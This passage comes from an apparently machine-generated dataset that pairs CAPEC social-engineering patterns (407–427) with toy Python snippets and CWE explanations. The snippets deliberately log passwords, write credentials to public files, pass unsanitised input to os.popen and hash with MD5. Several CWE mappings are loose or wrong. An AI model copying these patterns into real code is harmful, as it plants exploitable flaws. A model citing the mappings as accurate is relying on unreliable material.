        "description": "This Python code snippet demonstrates several vulnerabilities related to the CAPEC 'Dumpster Diving' and associated CWEs. It simulates the generation of a core dump file containing sensitive information (CWE-528), which is then improperly moved to a 'decommissioned' directory without proper scrubbing (CWE-1266). Additionally, it creates a version-control repository in a directory that could be exposed to unauthorized actors (CWE-527). Finally, it prints sensitive information in cleartext, simulating cleartext transmission (CWE-319). The code highlights how sensitive information can be mishandled and potentially exposed, making it susceptible to dumpster diving attacks."
    },
    {
        "capec_id": "407",
        "capec_name": "Pretexting",
        "code_snippet": "import requests\n\n# CWE-300: Channel Accessible by Non-Endpoint\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# CWE-451: User Interface (UI) Misrepresentation of Critical Information\n\ndef pretexting_attack(target_url, fake_identity, sensitive_info):\n    # Create a fake identity (pretext)\n    headers = {\n        'User-Agent': fake_identity['user_agent'],\n        'From': fake_identity['email']\n    }\n\n    # CWE-451: Misrepresenting critical information in the UI\n    # CWE-300: Not verifying the identity of the actor at the endpoint\n    response = requests.get(target_url, headers=headers)\n\n    if response.status_code == 200:\n        # CWE-200: Exposing sensitive information to an unauthorized actor\n        print(f\"Sensitive Information: {sensitive_info}\")\n    else:\n        print(\"Failed to retrieve information\")\n\n# Example usage\nfake_identity = {\n    'user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',\n    'email': 'attacker@example.com'\n}\nsensitive_info = \"User's password: 12345\"\npretexting_attack('http://example.com', fake_identity, sensitive_info)",
        "description": "This Python code snippet demonstrates a pretexting attack where an adversary uses a fake identity to solicit information from a target. The code uses the `requests` library to send a GET request to a target URL with headers that include a fake user agent and email, representing the pretexting behavior (CAPEC). The code also highlights several related CWEs: CWE-300 (Channel Accessible by Non-Endpoint) by not verifying the identity of the actor at the endpoint, CWE-451 (User Interface Misrepresentation of Critical Information) by misrepresenting critical information in the headers, and CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) by printing sensitive information if the request is successful. This snippet encapsulates the essence of a pretexting attack by demonstrating how an attacker might manipulate a target into revealing sensitive information using a fabricated identity."
    },
    {
        "capec_id": "408",
        "capec_name": "DEPRECATED: Information Gathering from Traditional Sources",
        "code_snippet": "import logging\n\n# Configuration for logging\nlogging.basicConfig(filename='server.log', level=logging.DEBUG)\n\n# Simulated function that logs sensitive information\n\ndef process_user_data(user_id, user_data):\n    # Vulnerable: Logging sensitive information\n    logging.debug(f'Processing data for user {user_id}: {user_data}')\n\n# Example usage\nuser_id = '12345'\nuser_data = {'name': 'John Doe', 'ssn': '123-45-6789'}\nprocess_user_data(user_id, user_data)",
        "description": "This Python code snippet demonstrates a vulnerability related to the deprecated CAPEC-118 and its associated CWEs, particularly CWE-532 (Information Exposure Through Log Files). The code configures logging to write to a file named 'server.log' and includes a function 'process_user_data' that logs sensitive user information (user ID and user data) at the DEBUG level. This practice can lead to information exposure if the log files are accessed by unauthorized individuals. The main idea represented here is the improper handling and logging of sensitive information, which can be exploited for information gathering."
    },
    {
        "capec_id": "409",
        "capec_name": "DEPRECATED: Information Gathering from Non-Traditional Sources",
        "code_snippet": "import logging\nimport os\n\n# Configure logging to write to a file\nlogging.basicConfig(filename='app.log', level=logging.DEBUG)\n\n# Simulate storing sensitive data without encryption\nsensitive_data = 'user_password=12345'\n\n# Log sensitive data (CWE-532: Information Exposure Through Log Files)\nlogging.debug(f'Storing sensitive data: {sensitive_data}')\n\n# Simulate a DNS lookup for a security decision (CWE-350: Reliance on DNS Lookups in a Security Decision)\ndef is_trusted_domain(domain):\n    try:\n        ip = os.popen(f'nslookup {domain}').read()\n        return 'trusted' in ip\n    except Exception as e:\n        logging.error(f'Error during DNS lookup: {e}')\n        return False\n\n# Example usage\nif is_trusted_domain('example.com'):\n    logging.info('Domain is trusted')\nelse:\n    logging.warning('Domain is not trusted')",
        "description": "This Python code snippet demonstrates several deprecated weaknesses related to information exposure and security decisions based on DNS lookups. The code configures logging to write to a file and logs sensitive data, which can lead to information exposure through log files (CWE-532). Additionally, it includes a function that performs a DNS lookup to determine if a domain is trusted, which is a flawed security decision-making process (CWE-350). The code highlights the risks of storing sensitive data without encryption and relying on DNS lookups for security decisions."
    },
    {
        "capec_id": "410",
        "capec_name": "Information Elicitation",
        "code_snippet": "import socket\n\n# CWE-940: Improper Verification of Source of a Communication Channel\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n\ndef handle_client(client_socket):\n    request = client_socket.recv(1024).decode('utf-8')\n    print(f\"Received request: {request}\")\n\n    # CWE-205: Observable Behavioral Discrepancy\n    if 'SECRET' in request:\n        response = \"Sensitive Information: The secret code is 1234\"\n    else:\n        response = \"Hello, World!\"\n\n    client_socket.send(response.encode('utf-8'))\n    client_socket.close()\n\n# CWE-940: No proper verification of the source of the communication channel\nserver_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nserver_socket.bind(('0.0.0.0', 9999))\nserver_socket.listen(5)\nprint(\"Server listening on port 9999\")\n\nwhile True:\n    client_socket, addr = server_socket.accept()\n    print(f\"Accepted connection from {addr}\")\n    handle_client(client_socket)\n",
        "description": "This Python code snippet demonstrates a simple server that listens for incoming connections and handles client requests. The code embodies the main idea of CAPEC-118 (Information Elicitation) by showing how an adversary could extract sensitive information through social engineering methods. The server does not properly verify the source of the communication channel (CWE-940), leading to potential exposure of sensitive information to unauthorized actors (CWE-200). Additionally, the server's behavior changes based on the content of the request (CWE-205), which could be observed by an attacker to infer the presence of sensitive information."
    },
    {
        "capec_id": "411",
        "capec_name": "DEPRECATED: Pretexting",
        "code_snippet": "import logging\n\n# Setting up logging to a file\nlogging.basicConfig(filename='app.log', level=logging.DEBUG)\n\n# Simulating sensitive information\nuser_password = 'SuperSecretPassword123'\n\n# Logging sensitive information (vulnerable practice)\nlogging.debug(f'User password: {user_password}')\n\n# Simulating an authentication check\ndef authenticate(user_input):\n    if user_input == user_password:\n        return 'Access Granted'\n    else:\n        return 'Access Denied'\n\n# User input simulation\nuser_input = 'WrongPassword'\nprint(authenticate(user_input))",
        "description": "This Python code snippet demonstrates a vulnerable practice related to the deprecated CAPEC-407: Social Information Gathering via Pretexting, and the related CWEs, particularly CWE-532 (Information Exposure Through Log Files). The code sets up logging to a file and logs sensitive information (a user password) in debug mode. This practice can lead to information exposure if the log files are accessed by unauthorized individuals. Additionally, the code includes a simple authentication function that checks the user input against the logged password, representing a potential authentication bypass issue (related to CWE-287). The main idea is to highlight the risks of logging sensitive information and the potential for social engineering attacks to exploit such vulnerabilities."
    },
    {
        "capec_id": "412",
        "capec_name": "Pretexting via Customer Service",
        "code_snippet": "import socket\n\nclass CustomerService:\n    def __init__(self, server_ip, server_port):\n        self.server_ip = server_ip\n        self.server_port = server_port\n        self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n    def connect(self):\n        self.client_socket.connect((self.server_ip, self.server_port))\n\n    def request_sensitive_info(self, user_id):\n        # CWE-940: No verification of the source of the communication channel\n        self.client_socket.sendall(f'GET_SENSITIVE_INFO {user_id}'.encode())\n        response = self.client_socket.recv(1024)\n        return response.decode()\n\n    def close(self):\n        self.client_socket.close()\n\n# Example usage\nif __name__ == '__main__':\n    # CWE-300: No verification of the identity of the server\n    service = CustomerService('192.168.1.100', 8080)\n    service.connect()\n    sensitive_info = service.request_sensitive_info('user123')\n    print(f'Sensitive Information: {sensitive_info}')\n    service.close()",
        "description": "This Python code snippet demonstrates a vulnerable implementation of a customer service client that requests sensitive information from a server. The code embodies the main idea of CAPEC-Pretexting via Customer Service by simulating a scenario where an adversary could impersonate a customer service representative to solicit sensitive information. The code includes several related CWEs:\n\n1. CWE-940: The `request_sensitive_info` method does not verify the source of the communication channel, allowing an adversary to potentially intercept or manipulate the request.\n2. CWE-300: The `connect` method does not verify the identity of the server, making the communication channel susceptible to man-in-the-middle attacks.\n3. CWE-200: The `request_sensitive_info` method could expose sensitive information to an unauthorized actor if the server is not properly authenticated.\n\nThe code is concise and represents the main point of the CAPEC by showing how improper verification and lack of secure communication can lead to the exposure of sensitive information."
    },
    {
        "capec_id": "413",
        "capec_name": "Pretexting via Tech Support",
        "code_snippet": "import os\n\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# CWE-359: Exposure of Private Personal Information to an Unauthorized Actor\n# CWE-434: Unrestricted Upload of File with Dangerous Type\n# CWE-1263: Improper Physical Access Control\n# CWE-538: Insertion of Sensitive Information into Externally-Accessible File or Directory\n\ndef handle_tech_support_request(user_input):\n    # Simulate a tech support request handling\n    if 'password' in user_input.lower():\n        # CWE-200: Exposing sensitive information\n        return 'Your password is: 12345'\n    elif 'upload' in user_input.lower():\n        # CWE-434: Allowing dangerous file upload\n        file_path = '/uploads/malicious.exe'\n        with open(file_path, 'wb') as f:\n            f.write(b'Malicious content')\n        return f'File uploaded to {file_path}'\n    else:\n        return 'Request not recognized'\n\n# Simulate a tech support interaction\nuser_request = 'Can you help me with my password?'\nresponse = handle_tech_support_request(user_request)\nprint(response)\n\n# Simulate another tech support interaction\nuser_request = 'I need to upload a file'\nresponse = handle_tech_support_request(user_request)\nprint(response)\n\n# CWE-538: Inserting sensitive information into an externally-accessible file\nsensitive_info = 'User: admin, Password: admin123'\nwith open('/public/info.txt', 'w') as f:\n    f.write(sensitive_info)\n\n# CWE-1263: Improper physical access control\nif os.path.exists('/public/info.txt'):\n    print('Sensitive information is accessible in /public/info.txt')",
        "description": "This Python code snippet simulates a tech support interaction that embodies the main idea of the CAPEC 'Pretexting via Tech Support'. The function `handle_tech_support_request` demonstrates how an adversary might solicit sensitive information (CWE-200) or allow the upload of a dangerous file (CWE-434). Additionally, the code shows how sensitive information can be improperly stored in an externally-accessible file (CWE-538) and highlights the risk of improper physical access control (CWE-1263) by checking if the sensitive file is accessible. The code represents the potential vulnerabilities and risks associated with social engineering attacks where an adversary impersonates tech support to gain unauthorized access or manipulate the target."
    },
    {
        "capec_id": "414",
        "capec_name": "Pretexting via Delivery Person",
        "code_snippet": "import os\nimport socket\n\n# CWE-941: Incorrectly Specified Destination in a Communication Channel\n# CWE-300: Channel Accessible by Non-Endpoint\n# CWE-538: Insertion of Sensitive Information into Externally-Accessible File or Directory\n\n# Simulate a delivery person pretexting attack\nclass DeliveryPersonPretexting:\n    def __init__(self, target_ip, target_port):\n        self.target_ip = target_ip\n        self.target_port = target_port\n        self.sensitive_info = \"Sensitive Data: User credentials\"\n\n    def initiate_communication(self):\n        try:\n            # CWE-941: Incorrectly specified destination\n            # CWE-300: Channel accessible by non-endpoint\n            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n                s.connect((self.target_ip, self.target_port))\n                s.sendall(b\"Hello, I have a delivery for you.\")\n                response = s.recv(1024)\n                print(f\"Received: {response.decode()}\")\n\n                # CWE-538: Insertion of sensitive information into externally-accessible file\n                with open(\"/tmp/delivery_info.txt\", \"w\") as f:\n                    f.write(self.sensitive_info)\n                print(\"Sensitive information written to /tmp/delivery_info.txt\")\n        except Exception as e:\n            print(f\"An error occurred: {e}\")\n\n# Example usage\nif __name__ == \"__main__\":\n    attacker = DeliveryPersonPretexting(\"192.168.1.10\", 8080)\n    attacker.initiate_communication()",
        "description": "This Python code snippet simulates a 'Pretexting via Delivery Person' attack. The `DeliveryPersonPretexting` class represents an adversary impersonating a delivery person to initiate communication with a target. The `initiate_communication` method demonstrates several vulnerabilities: \n1. CWE-941: The destination IP and port are specified, but there is no verification of the target's identity.\n2. CWE-300: The communication channel is not secured, allowing potential interception by non-endpoints.\n3. CWE-538: Sensitive information is written to an externally-accessible file, making it vulnerable to unauthorized access. \nThis code highlights how an attacker can exploit these weaknesses to solicit information or manipulate the target."
    },
    {
        "capec_id": "415",
        "capec_name": "Pretexting via Phone",
        "code_snippet": "import random\n\nclass PhoneSystem:\n    def __init__(self):\n        self.employees = {'Alice': '1234', 'Bob': '5678'}\n        self.help_desk = '9999'\n\n    def verify_identity(self, caller_id):\n        # CWE-940: Improper Verification of Source of a Communication Channel\n        if caller_id in self.employees.values() or caller_id == self.help_desk:\n            return True\n        return False\n\n    def handle_call(self, caller_id, request):\n        if self.verify_identity(caller_id):\n            # CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n            if request == 'get_employee_info':\n                return self.employees\n            elif request == 'reset_password':\n                return 'Password reset successful'\n        else:\n            return 'Unauthorized access attempt'\n\n# Simulating a pretexting attack\nphone_system = PhoneSystem()\n\n# Adversary impersonates help desk\nadversary_caller_id = '9999'\n\n# Adversary requests sensitive information\nresponse = phone_system.handle_call(adversary_caller_id, 'get_employee_info')\nprint(response)",
        "description": "This Python code snippet simulates a phone system where an adversary can perform a pretexting attack by impersonating a trusted entity, such as the help desk. The `PhoneSystem` class contains a method `verify_identity` that checks the caller ID against a list of known employees and the help desk number. However, this verification is weak (CWE-940), allowing an adversary to bypass it by using a known caller ID. The `handle_call` method then processes requests, potentially exposing sensitive information (CWE-200) if the caller ID is verified. The code demonstrates how an adversary can exploit these weaknesses to gain unauthorized access to sensitive information by impersonating a trusted entity over the phone."
    },
    {
        "capec_id": "416",
        "capec_name": "Manipulate Human Behavior",
        "code_snippet": "import time\n\nclass HelpDesk:\n    def __init__(self):\n        self.sensitive_info = 'User: JohnDoe, Password: 1234'\n        self.request_count = {}\n\n    def handle_request(self, user, request):\n        if user not in self.request_count:\n            self.request_count[user] = 0\n        self.request_count[user] += 1\n\n        # CWE-799: Improper Control of Interaction Frequency\n        if self.request_count[user] > 5:\n            print('Too many requests, please try again later.')\n            return\n\n        # Simulate a delay to make the user feel comfortable (social engineering)\n        time.sleep(2)\n\n        # CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n        if 'password reset' in request.lower():\n            print(f'Sensitive Info: {self.sensitive_info}')\n        else:\n            print('Request handled.')\n\n# Simulate an adversary manipulating the help desk\nhelp_desk = HelpDesk()\nfor i in range(7):\n    help_desk.handle_request('attacker', 'password reset')",
        "description": "This Python code snippet simulates a help desk system that can be manipulated through social engineering techniques. The HelpDesk class contains sensitive information and a method to handle user requests. The handle_request method tracks the number of requests per user (CWE-799: Improper Control of Interaction Frequency) and exposes sensitive information if a 'password reset' request is made (CWE-200: Exposure of Sensitive Information to an Unauthorized Actor). The code also includes a delay to make the user feel comfortable, representing a subtle manipulation technique described in the CAPEC. The adversary repeatedly makes 'password reset' requests to exploit the system and gain sensitive information."
    },
    {
        "capec_id": "417",
        "capec_name": "Influence Perception",
        "code_snippet": "import getpass\n\n# CWE-654: Reliance on a Single Factor in a Security Decision\n# CWE-656: Reliance on Security Through Obscurity\n# CWE-205: Observable Behavioral Discrepancy\n# CWE-222: Truncation of Security-relevant Information\n# CWE-301: Reflection Attack in an Authentication Protocol\n\n# Simulated user database\nusers = {'admin': 'password123'}\n\n# Function to simulate a login process\ndef login(username, password):\n    if username in users and users[username] == password:\n        print(\"Login successful!\")\n        return True\n    else:\n        print(\"Login failed!\")\n        return False\n\n# Function to simulate a social engineering attack\ndef social_engineering_attack():\n    print(\"Simulating social engineering attack...\")\n    # Adversary tricks the user into revealing their password\n    username = input(\"Enter your username: \")\n    password = getpass.getpass(\"Enter your password: \")\n    # Adversary uses the obtained credentials to login\n    login(username, password)\n\n# Main function to run the simulation\ndef main():\n    social_engineering_attack()\n\nif __name__ == \"__main__\":\n    main()",
        "description": "This Python code snippet simulates a social engineering attack where an adversary tricks a user into revealing their password. The code demonstrates several security weaknesses:\n\n1. **CWE-654: Reliance on a Single Factor in a Security Decision** - The login function relies solely on the username and password for authentication.\n2. **CWE-656: Reliance on Security Through Obscurity** - The password is stored in plain text, assuming that its secrecy is sufficient for security.\n3. **CWE-205: Observable Behavioral Discrepancy** - The login function provides clear feedback on whether the login was successful or not, which can be exploited by an attacker.\n4. **CWE-222: Truncation of Security-relevant Information** - The code does not handle cases where the input might be truncated, potentially obscuring the nature of an attack.\n5. **CWE-301: Reflection Attack in an Authentication Protocol** - The code does not protect against reflection attacks, where an attacker could use the target machine to impersonate a trusted user.\n\nThe main idea of the CAPEC is represented by the social_engineering_attack function, which simulates the adversary's attempt to influence the target's perception and obtain sensitive information."
    },
    {
        "capec_id": "418",
        "capec_name": "Influence Perception of Reciprocation",
        "code_snippet": "import socket\n\n# CWE-940: Improper Verification of Source of a Communication Channel\n# CWE-941: Incorrectly Specified Destination in a Communication Channel\n# CWE-300: Channel Accessible by Non-Endpoint\n# CWE-301: Reflection Attack in an Authentication Protocol\n# CWE-222: Truncation of Security-relevant Information\n\ndef create_socket_connection(host, port):\n    try:\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.connect((host, port))\n        return s\n    except Exception as e:\n        print(f\"Connection error: {str(e)}\")\n        return None\n\n# Simulate a social engineering attack\n# Compliment followed by a question to extract sensitive information\ndef social_engineering_attack(target_host, target_port):\n    s = create_socket_connection(target_host, target_port)\n    if s:\n        try:\n            # CWE-940: No verification of the source\n            s.sendall(b\"You have a great server setup! What software are you using?\")\n            response = s.recv(1024)\n            # CWE-222: Truncation of security-relevant information\n            print(f\"Received: {response[:50]}\")\n        except Exception as e:\n            print(f\"Communication error: {str(e)}\")\n        finally:\n            s.close()\n\n# Example usage\nsocial_engineering_attack('example.com', 80)",
        "description": "This Python code snippet demonstrates a basic social engineering attack where an adversary uses a compliment followed by a question to extract sensitive information from a target server. The code creates a socket connection to the target host and port without verifying the source of the communication channel (CWE-940). It then sends a message designed to elicit a response containing potentially sensitive information. The response is received and truncated (CWE-222) before being printed. This example embodies the CAPEC concept of influencing the perception of reciprocation to extract information, while also highlighting related weaknesses such as improper verification and truncation of security-relevant information."
    },
    {
        "capec_id": "419",
        "capec_name": "DEPRECATED: Target Influence via Perception of Concession",
        "code_snippet": "import requests\n\n# CWE-941: Incorrectly Specified Destination in a Communication Channel\n# CWE-757: Selection of Less-Secure Algorithm During Negotiation\n# CWE-205 & CWE-203: Observable Behavioral Discrepancy and Observable Discrepancy\n\n# Simulate a function that sends sensitive data to a server\n# The server URL is incorrectly specified, leading to potential data leakage\n# Additionally, the function allows for algorithm downgrade attacks\n\ndef send_sensitive_data(data):\n    # Incorrectly specified destination (CWE-941)\n    server_url = 'http://example.com/api/send_data'  # Should be 'https://secure.example.com/api/send_data'\n    \n    # Simulate algorithm negotiation (CWE-757)\n    algorithms = ['AES256', 'AES128', 'DES']\n    selected_algorithm = 'DES'  # Less secure algorithm selected\n    \n    # Observable discrepancy (CWE-205 & CWE-203)\n    if selected_algorithm == 'DES':\n        print('Warning: Using less secure algorithm DES')\n    \n    # Send data\n    response = requests.post(server_url, json={'data': data, 'algorithm': selected_algorithm})\n    \n    # Observable behavioral discrepancy\n    if response.status_code == 200:\n        print('Data sent successfully')\n    else:\n        print('Failed to send data')\n\n# Example usage\nsend_sensitive_data('sensitive information')",
        "description": "This Python code snippet demonstrates several security weaknesses related to the deprecated CAPEC pattern 'Target Influence via Perception of Concession' and the associated CWEs. The function `send_sensitive_data` is designed to send sensitive data to a server. However, it contains multiple vulnerabilities:\n\n1. **CWE-941: Incorrectly Specified Destination in a Communication Channel** - The server URL is specified using 'http' instead of 'https', leading to potential data leakage.\n2. **CWE-757: Selection of Less-Secure Algorithm During Negotiation** - The function allows for the selection of a less secure algorithm (DES) during negotiation, which can be exploited by an attacker.\n3. **CWE-205 & CWE-203: Observable Behavioral Discrepancy and Observable Discrepancy** - The function prints a warning when a less secure algorithm is selected and provides different responses based on the success or failure of the data transmission, which can be observed by an attacker to infer the internal state or decision process of the application.\n\nOverall, the code snippet embodies the main idea of the deprecated CAPEC pattern by demonstrating how an attacker can influence the target's behavior and decision-making process through observable discrepancies and insecure configurations."
    },
    {
        "capec_id": "420",
        "capec_name": "Influence Perception of Scarcity",
        "code_snippet": "import time\n\nclass ScarcityInfluence:\n    def __init__(self):\n        self.stock = 1  # CWE-654: Reliance on a Single Factor\n\n    def check_availability(self):\n        if self.stock > 0:\n            return True\n        return False\n\n    def purchase_item(self, user):\n        if self.check_availability():\n            self.stock -= 1\n            print(f\"Purchase successful for {user}!\")\n        else:\n            print(\"Item out of stock!\")\n\n    def create_urgency(self):\n        print(\"Hurry! Only 1 item left in stock!\")  # CWE-205: Observable Behavioral Discrepancy\n        time.sleep(2)  # CWE-405: Asymmetric Resource Consumption\n        self.purchase_item('User1')\n\n# Simulate the attack\nscarcity = ScarcityInfluence()\nscarcity.create_urgency()",
        "description": "This Python code snippet demonstrates the concept of 'Influence Perception of Scarcity' by creating a class that simulates a limited stock scenario. The class relies on a single factor (stock count) to make security decisions (CWE-654). The `create_urgency` method prints a message to create a sense of urgency (CWE-205) and then simulates a delay (CWE-405) before attempting a purchase. The `purchase_item` method checks availability and updates the stock, demonstrating how an adversary might leverage perceived scarcity to influence user behavior."
    },
    {
        "capec_id": "421",
        "capec_name": "Influence Perception of Authority",
        "code_snippet": "import socket\n\n# CWE-300: Channel Accessible by Non-Endpoint\n# CWE-940: Improper Verification of Source of a Communication Channel\n# CWE-654: Reliance on a Single Factor in a Security Decision\n\ndef impersonate_authority(target_ip, target_port):\n    try:\n        # Create a socket connection to the target\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.connect((target_ip, target_port))\n\n        # CWE-654: Reliance on a Single Factor in a Security Decision\n        # Send a message impersonating an authority figure\n        authority_message = \"ADMIN: Please provide your credentials for verification.\"\n        s.sendall(authority_message.encode('utf-8'))\n\n        # Receive the response from the target\n        response = s.recv(1024)\n        print(f\"Received: {response.decode('utf-8')}\")\n\n        s.close()\n    except Exception as e:\n        print(f\"An error occurred: {e}\")\n\n# Example usage\nimpersonate_authority('192.168.1.10', 8080)",
        "description": "This Python code snippet demonstrates a simple example of an adversary using a social engineering technique to impersonate an authority figure and extract sensitive information from a target. The code creates a socket connection to the target machine (CWE-300) and sends a message pretending to be an administrator requesting credentials (CWE-654). The code does not verify the source of the communication channel (CWE-940), making it vulnerable to exploitation. This embodies the main idea of the CAPEC 'Influence Perception of Authority' by showing how an attacker can use impersonation to manipulate a target into revealing sensitive information."
    },
    {
        "capec_id": "422",
        "capec_name": "Influence Perception of Commitment and Consistency",
        "code_snippet": "import requests\n\nclass SocialEngineer:\n    def __init__(self, target_url):\n        self.target_url = target_url\n        self.session = requests.Session()\n\n    def minor_request(self):\n        response = self.session.get(f'{self.target_url}/minor_task')\n        if response.status_code == 200:\n            print('Minor task completed')\n            return True\n        return False\n\n    def major_request(self):\n        response = self.session.get(f'{self.target_url}/major_task')\n        if response.status_code == 200:\n            print('Major task completed')\n            return True\n        return False\n\n    def execute(self):\n        if self.minor_request():\n            self.major_request()\n\n# Example usage\nengineer = SocialEngineer('http://example.com')\nengineer.execute()",
        "description": "This Python code snippet demonstrates a simplified version of a social engineering attack based on the CAPEC 'Influence Perception of Commitment and Consistency'. The 'SocialEngineer' class simulates an adversary who first makes a minor request to the target URL. If the minor request is successful, the adversary then makes a major request. This embodies the idea that individuals are more likely to comply with larger requests after agreeing to smaller ones. The code also touches on related CWEs: it does not limit the number of interactions (CWE-799), and it does not verify the source of the communication (CWE-940). The observable discrepancies in responses (CWE-203) can be exploited to infer the success of the requests."
    },
    {
        "capec_id": "423",
        "capec_name": "Influence Perception of Liking",
        "code_snippet": "import hashlib\n\nclass AuthenticationSystem:\n    def __init__(self):\n        self.users = {'trusted_user': '5f4dcc3b5aa765d61d8327deb882cf99'}  # md5 for 'password'\n        self.session_tokens = {}\n\n    def authenticate(self, username, password):\n        hashed_password = hashlib.md5(password.encode()).hexdigest()\n        if username in self.users and self.users[username] == hashed_password:\n            token = self.generate_token(username)\n            self.session_tokens[username] = token\n            return token\n        return None\n\n    def generate_token(self, username):\n        return hashlib.md5(username.encode()).hexdigest()\n\n    def access_resource(self, token):\n        for user, user_token in self.session_tokens.items():\n            if user_token == token:\n                return f\"Access granted to {user}\"\n        return \"Access denied\"\n\n# Adversary attempts to influence the target\nadversary = AuthenticationSystem()\n\n# Adversary builds a relationship and gets the target to use their system\n# Target uses the system and gets a session token\nsession_token = adversary.authenticate('trusted_user', 'password')\n\n# Adversary uses the session token to access resources\nif session_token:\n    print(adversary.access_resource(session_token))\nelse:\n    print(\"Authentication failed\")",
        "description": "This Python code snippet demonstrates an authentication system where an adversary influences a target to use their system, thereby gaining access to the target's session token. The code includes vulnerabilities related to the CAPEC and CWEs: reliance on a single factor (CWE-654) for authentication, use of MD5 hashing (which is weak and can be considered security through obscurity, CWE-656), and the potential for reflection attacks (CWE-301) if the token is reused. The adversary builds a relationship with the target, gets them to authenticate, and then uses the session token to access resources, embodying the 'Influence Perception of Liking' CAPEC."
    },
    {
        "capec_id": "424",
        "capec_name": "Influence Perception of Consensus or Social Proof",
        "code_snippet": "import random\n\nclass VotingSystem:\n    def __init__(self):\n        self.votes = {'A': 0, 'B': 0}\n        self.user_votes = {}\n\n    def vote(self, user, choice):\n        if user in self.user_votes:\n            print(\"User has already voted.\")\n            return\n        if choice not in self.votes:\n            print(\"Invalid choice.\")\n            return\n        self.user_votes[user] = choice\n        self.votes[choice] += 1\n        self.display_votes()\n\n    def display_votes(self):\n        # Simulate observable discrepancy by showing different results to different users\n        if random.choice([True, False]):\n            print(f\"Current votes: {self.votes}\")\n        else:\n            print(\"Current votes: {A: 0, B: 0}\")\n\n# Example usage\nvoting_system = VotingSystem()\nvoting_system.vote('user1', 'A')\nvoting_system.vote('user2', 'B')\nvoting_system.vote('user3', 'A')",
        "description": "This Python code snippet represents a vulnerable voting system that embodies the CAPEC 'Influence Perception of Consensus or Social Proof'. The system allows users to vote for choices 'A' or 'B'. However, it introduces observable discrepancies (CWE-203, CWE-205) by displaying different vote counts randomly, which can mislead users about the current consensus. This can influence users to vote in a way that aligns with the adversary's goals. Additionally, the system relies on a single factor (user identity) to prevent multiple votes (CWE-654), which can be easily bypassed. The code demonstrates how an adversary can manipulate perceived consensus to influence user behavior."
    },
    {
        "capec_id": "425",
        "capec_name": "Target Influence via Framing",
        "code_snippet": "import requests\n\nclass FramingInfluence:\n    def __init__(self, target_url):\n        self.target_url = target_url\n\n    def send_request(self, data):\n        # CWE-941: Incorrectly Specified Destination in a Communication Channel\n        # CWE-300: Channel Accessible by Non-Endpoint\n        response = requests.post(self.target_url, json=data)\n        return response.json()\n\n    def influence_target(self, data):\n        # CWE-654: Reliance on a Single Factor in a Security Decision\n        # CWE-451: User Interface (UI) Misrepresentation of Critical Information\n        if 'decision' in data and data['decision'] == 'yes':\n            print(\"Positive framing: Your decision is appreciated!\")\n        else:\n            print(\"Positive framing: Let's consider the benefits.\")\n        return self.send_request(data)\n\n# Example usage\nframing = FramingInfluence('http://example.com/api')\ndata = {'decision': 'yes', 'info': 'sensitive data'}\nresponse = framing.influence_target(data)\nprint(response)",
        "description": "This Python code snippet demonstrates the concept of 'Target Influence via Framing' by using a class to send requests to a target URL while framing the conversation positively. The `influence_target` method checks the decision in the data and frames the response positively, regardless of the decision. This aligns with the CAPEC description of using framing techniques to influence the target. The code also incorporates related CWEs: CWE-941 and CWE-300 are represented by the potential for incorrect destination specification and channel access issues in the `send_request` method, while CWE-654 and CWE-451 are represented by the reliance on a single decision factor and potential UI misrepresentation in the `influence_target` method."
    },
    {
        "capec_id": "426",
        "capec_name": "Influence via Incentives",
        "code_snippet": "import random\n\nclass User:\n    def __init__(self, username, balance):\n        self.username = username\n        self.balance = balance\n\n    def transfer_funds(self, amount, destination):\n        if self.balance >= amount:\n            self.balance -= amount\n            destination.balance += amount\n            print(f\"Transferred {amount} to {destination.username}\")\n        else:\n            print(\"Insufficient funds\")\n\nclass Adversary:\n    def __init__(self, target):\n        self.target = target\n\n    def incentivize(self):\n        # Simulate gathering information about the target's vulnerability\n        incentive = random.choice(['financial', 'social', 'ideological'])\n        print(f\"Using {incentive} incentive to influence {self.target.username}\")\n        if incentive == 'financial':\n            self.target.transfer_funds(100, self)\n        elif incentive == 'social':\n            print(f\"{self.target.username} is influenced by peer pressure\")\n        elif incentive == 'ideological':\n            print(f\"{self.target.username} is influenced by ideological beliefs\")\n\n# Example usage\nuser = User('victim', 150)\nadversary = Adversary(user)\nadversary.incentivize()",
        "description": "This Python code snippet demonstrates the concept of 'Influence via Incentives' by simulating an adversary who gathers information about a target's vulnerabilities and uses different types of incentives (financial, social, ideological) to influence the target's behavior. The 'User' class represents a user with a balance, and the 'Adversary' class represents an attacker who tries to manipulate the user. The code includes a method to transfer funds, which can be exploited by the adversary using financial incentives. This snippet also touches on related CWEs: CWE-1229 (creation of emergent resource) by indirectly creating a new resource (adversary's balance), CWE-405 (asymmetric resource consumption) by making the user transfer funds, and CWE-654 (reliance on a single factor) by relying on a single incentive type to influence the user."
    },
    {
        "capec_id": "427",
        "capec_name": "Influence via Psychological Principles",
        "code_snippet": "import getpass\n\n# CWE-654: Reliance on a Single Factor in a Security Decision\n# CWE-301: Reflection Attack in an Authentication Protocol\n# CWE-205: Observable Behavioral Discrepancy\n# CWE-222: Truncation of Security-relevant Information\n\n# Simulated user database\nusers = {'admin': 'password123'}\n\n# Function to simulate login\ndef login(username, password):\n    if username in users and users[username] == password:\n        print(\"Login successful!\")\n        return True\n    else:\n        print(\"Login failed!\")\n        return False\n\n# Function to simulate a reflection attack\ndef reflection_attack():\n    username = input(\"Enter username: \")\n    password = getpass.getpass(\"Enter password: \")\n    # CWE-654: Single factor authentication\n    if login(username, password):\n        # CWE-205: Observable behavioral discrepancy\n        print(\"Access granted to sensitive operations.\")\n    else:\n        print(\"Access denied.\")\n\n# CWE-222: Truncation of security-relevant information\ndef log_event(event):\n    truncated_event = event[:10]  # Truncate event to first 10 characters\n    print(f\"Event logged: {truncated_event}\")\n\n# Simulate an attack\nreflection_attack()\nlog_event(\"Unauthorized access attempt detected.\")",
